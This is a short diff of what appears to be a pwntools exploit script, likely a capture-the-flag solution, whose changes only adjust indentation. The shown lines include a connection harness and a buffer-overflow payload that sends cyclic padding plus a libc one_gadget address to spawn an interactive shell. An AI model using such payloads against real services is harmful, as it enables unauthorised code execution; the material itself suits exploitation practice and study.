@@ -12,15 +12,15 @@ def remote(argv = [], *a, **kw):
     '''Connect to the process on the remote host'''
     io = connect(host, port)
     if args.GDB:
-        gdb.attach(io, gdbscript = gdbscript)
+       gdb.attach(io, gdbscript = gdbscript)
     return io
 
 def start(argv = [], *a, **kw):
     '''Start the exploit against the target.'''
     if args.LOCAL:
-        return local(argv, *a, **kw)
+       return local(argv, *a, **kw)
     else:
-        return remote(argv, *a, **kw)
+       return remote(argv, *a, **kw)
 
 gdbscript = '''
 continue
@@ -56,4 +56,3 @@ payload = libc.address + one_gadget
 io.sendline(cyclic(69 + 8) + p64(payload))
 
 io.interactive()
-
